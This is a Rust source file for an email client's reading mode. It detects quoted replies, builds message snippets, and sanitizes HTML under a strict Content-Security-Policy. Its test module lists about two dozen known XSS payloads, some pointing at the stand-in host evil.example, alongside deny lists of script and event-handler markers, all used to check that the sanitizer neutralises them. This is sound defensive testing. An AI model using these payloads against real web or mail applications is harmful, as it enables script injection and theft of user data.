//! Reading mode: quote detection, snippets and HTML sanitization.

use std::collections::HashSet;

use crate::model::{Block, BlockKind};

fn is_quote_line(l: &str) -> bool {
    l.trim_start().starts_with('>')
}

/// "On Mon, X wrote:" / "Il giorno ... ha scritto:" and friends.
fn is_attribution(l: &str) -> bool {
    let t = l.trim().to_lowercase();
    !t.is_empty()
        && t.len() < 300
        && (t.ends_with("wrote:")
            || t.ends_with("scritto:")
            || t.ends_with("a écrit :")
            || t.ends_with("a écrit:")
            || t.ends_with("schrieb:")
            || t.ends_with("escribió:"))
}

/// Outlook-style separators: everything after them is the quoted original.
fn is_forward_separator(l: &str) -> bool {
    let t = l.trim();
    let lower = t.to_lowercase();
    (lower.starts_with("-----") && (lower.contains("original") || lower.contains("originale")))
        || lower.starts_with("---------- forwarded message")
        || lower.starts_with("---------- messaggio inoltrato")
        || (t.len() >= 20 && t.chars().all(|c| c == '_'))
}

fn push(blocks: &mut Vec<Block>, kind: BlockKind, lines: &[&str]) {
    let mut start = 0;
    let mut end = lines.len();
    while start < end && lines[start].trim().is_empty() {
        start += 1;
    }
    while end > start && lines[end - 1].trim().is_empty() {
        end -= 1;
    }
    if start == end {
        return;
    }
    let slice = &lines[start..end];
    if let Some(last) = blocks.last_mut() {
        if last.kind == kind {
            last.text.push_str("\n\n");
            last.text.push_str(&slice.join("\n"));
            last.lines += slice.len();
            return;
        }
    }
    blocks.push(Block {
        kind,
        text: slice.join("\n"),
        lines: slice.len(),
    });
}

/// Splits a message text into alternating text and quote blocks.
pub fn blocks(text: &str) -> Vec<Block> {
    let text = text.replace("\r\n", "\n");
    let lines: Vec<&str> = text.lines().collect();
    let mut blocks = Vec::new();
    let mut i = 0;
    let mut current: Vec<&str> = Vec::new();
    while i < lines.len() {
        let l = lines[i];
        if is_forward_separator(l) {
            push(&mut blocks, BlockKind::Text, &current);
            current.clear();
            push(&mut blocks, BlockKind::Quote, &lines[i..]);
            return blocks;
        }
        // attribution line followed (maybe after a blank) by a quote
        let next_quote = lines
            .get(i + 1)
            .map(|n| {
                is_quote_line(n)
                    || (n.trim().is_empty() && lines.get(i + 2).is_some_and(|m| is_quote_line(m)))
            })
            .unwrap_or(false);
        if is_quote_line(l) || (is_attribution(l) && next_quote) {
            push(&mut blocks, BlockKind::Text, &current);
            current.clear();
            let start = i;
            i += 1;
            while i < lines.len()
                && (is_quote_line(lines[i])
                    || (lines[i].trim().is_empty()
                        && lines.get(i + 1).is_some_and(|n| is_quote_line(n))))
            {
                i += 1;
            }
            push(&mut blocks, BlockKind::Quote, &lines[start..i]);
            continue;
        }
        current.push(l);
        i += 1;
    }
    push(&mut blocks, BlockKind::Text, &current);
    blocks
}

/// First ~160 characters of the non-quoted text, whitespace collapsed.
pub fn snippet(text: &str) -> String {
    let joined: String = blocks(text)
        .into_iter()
        .filter(|b| b.kind == BlockKind::Text)
        .map(|b| b.text)
        .collect::<Vec<_>>()
        .join(" ");
    let collapsed = joined.split_whitespace().collect::<Vec<_>>().join(" ");
    collapsed.chars().take(160).collect()
}

const PRESENTATION_ATTRS: &[&str] = &[
    "style",
    "align",
    "valign",
    "bgcolor",
    "color",
    "width",
    "height",
    "border",
    "cellpadding",
    "cellspacing",
    "dir",
    "face",
    "size",
];

/// Storage-time sanitization: no scripts, no forms, no event handlers.
pub fn sanitize_html(html: &str) -> String {
    let attrs: HashSet<&str> = PRESENTATION_ATTRS.iter().copied().collect();
    ammonia::Builder::default()
        .add_generic_attributes(attrs)
        .add_tags(["font", "center"])
        .link_rel(Some("noopener noreferrer"))
        .attribute_filter(|_, attribute, value| {
            // Script in CSS is dead in today's engines and the CSP blocks
            // loads anyway, but there is no reason to keep it around.
            if attribute == "style" && unsafe_css(value) {
                None
            } else {
                Some(value.into())
            }
        })
        .clean(html)
        .to_string()
}

fn unsafe_css(style: &str) -> bool {
    let s: String = style
        .chars()
        .filter(|c| !c.is_whitespace() && *c != '\\')
        .flat_map(char::to_lowercase)
        .collect();
    [
        "javascript:",
        "vbscript:",
        "expression(",
        "behavior:",
        "-moz-binding",
    ]
    .iter()
    .any(|bad| s.contains(bad))
}

/// View-time document for the sandboxed iframe. The CSP blocks every network
/// request unless images were explicitly enabled for this message.
pub fn html_document(sanitized: &str, allow_images: bool) -> String {
    let body = if allow_images {
        sanitized.to_string()
    } else {
        ammonia::Builder::default()
            .add_generic_attributes(PRESENTATION_ATTRS.iter().copied())
            .add_tags(["font", "center"])
            .attribute_filter(|element, attribute, value| {
                if element == "img" && attribute == "src" && !value.starts_with("data:") {
                    None
                } else {
                    Some(value.into())
                }
            })
            .clean(sanitized)
            .to_string()
    };
    let img_src = if allow_images {
        "img-src data: https: http:;"
    } else {
        "img-src data:;"
    };
    format!(
        "<!doctype html><html><head><meta charset=\"utf-8\">\
<meta http-equiv=\"Content-Security-Policy\" content=\"default-src 'none'; {img_src} style-src 'unsafe-inline'; font-src data:;\">\
<style>body{{margin:16px;font-family:sans-serif;font-size:14px;line-height:1.5;background:#fff;color:#111;word-wrap:break-word}}img{{max-width:100%;height:auto}}pre{{white-space:pre-wrap}}</style>\
</head><body>{body}</body></html>"
    )
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn splits_quotes() {
        let t = "Ciao,\nva bene.\n\nIl giorno lun 13 ott, Anna <a@b.it> ha scritto:\n> prima riga\n> seconda\n>\n> terza\n\n--\nfirma";
        let b = blocks(t);
        assert_eq!(b.len(), 3);
        assert_eq!(b[0].kind, BlockKind::Text);
        assert_eq!(b[0].text, "Ciao,\nva bene.");
        assert_eq!(b[1].kind, BlockKind::Quote);
        assert_eq!(b[1].lines, 5);
        assert!(b[1].text.starts_with("Il giorno"));
        assert_eq!(b[2].text, "--\nfirma");
    }

    #[test]
    fn outlook_separator_quotes_rest() {
        let t = "Ok\n\n-----Original Message-----\nFrom: x\nSubject: y\n\nbody";
        let b = blocks(t);
        assert_eq!(b.len(), 2);
        assert_eq!(b[1].kind, BlockKind::Quote);
        assert_eq!(b[1].lines, 5);
    }

    #[test]
    fn attribution_without_quote_is_text() {
        let b = blocks("Mario wrote:\nnothing quoted");
        assert_eq!(b.len(), 1);
        assert_eq!(b[0].kind, BlockKind::Text);
    }

    #[test]
    fn snippet_skips_quotes() {
        let s = snippet("Hello   there\n\n> old stuff\n");
        assert_eq!(s, "Hello there");
    }

    #[test]
    fn sanitize_removes_scripts_and_blocks_images() {
        let clean = sanitize_html(
            "<p style=\"color:red\" onclick=\"x()\">hi</p><script>alert(1)</script><img src=\"https://t.example/p.gif\">",
        );
        assert!(!clean.contains("script"));
        assert!(!clean.contains("onclick"));
        assert!(clean.contains("style=\"color:red\""));
        let doc = html_document(&clean, false);
        assert!(!doc.contains("t.example"));
        assert!(doc.contains("default-src 'none'"));
        let doc = html_document(&clean, true);
        assert!(doc.contains("t.example"));
    }

    /// Known XSS payloads: whatever survives sanitizing must be inert, since
    /// the iframe allows scripts (for our click listener) and only the CSP
    /// and this sanitizer stand between an email and code execution.
    #[test]
    fn xss_vectors_are_inert() {
        let vectors = [
            "<script>alert(1)</script>",
            "<SCRIPT SRC=//evil.example/x.js></SCRIPT>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "<svg><script>alert(1)</script></svg>",
            "<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>",
            "<a href=\"javascript:alert(1)\">x</a>",
            "<a href=\"JaVaScRiPt:alert(1)\">x</a>",
            "<a href=\"jav&#x09;ascript:alert(1)\">x</a>",
            "<a href=\"data:text/html,<script>alert(1)</script>\">x</a>",
            "<a href=\"vbscript:msgbox(1)\">x</a>",
            "<iframe src=\"https://evil.example\"></iframe>",
            "<object data=\"x.swf\"></object><embed src=\"x.swf\">",
            "<form action=\"https://evil.example\"><input name=p></form>",
            "<meta http-equiv=\"refresh\" content=\"0;url=https://evil.example\">",
            "<base href=\"https://evil.example/\">",
            "<link rel=stylesheet href=\"https://evil.example/x.css\">",
            "<style>@import url(https://evil.example/x.css)</style>",
            "<div style=\"background:url(javascript:alert(1))\">x</div>",
            "<p onmouseover=\"alert(1)\">x</p>",
            "<body onload=alert(1)>",
            "<details open ontoggle=alert(1)>",
            "<!--<script>-->alert(1)<!--</script>-->",
            "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">",
            "<template><script>alert(1)</script></template>",
        ];
        for v in vectors {
            let doc = html_document(&sanitize_html(v), true);
            let body = doc.split("</head>").nth(1).unwrap_or(&doc).to_lowercase();
            for bad in [
                "<script",
                "javascript:",
                "vbscript:",
                "onerror",
                "onload",
                "onclick",
                "onmouseover",
                "ontoggle",
                "<iframe",
                "<object",
                "<embed",
                "<form",
                "<meta",
                "<base",
                "<link",
                "data:text/html",
            ] {
                assert!(!body.contains(bad), "{bad:?} survived {v:?}: {body}");
            }
        }
        // every rendered document carries the CSP that blocks scripts
        let doc = html_document("<p>x</p>", true);
        assert!(doc.contains("default-src 'none'") && !doc.contains("script-src"));
    }
}
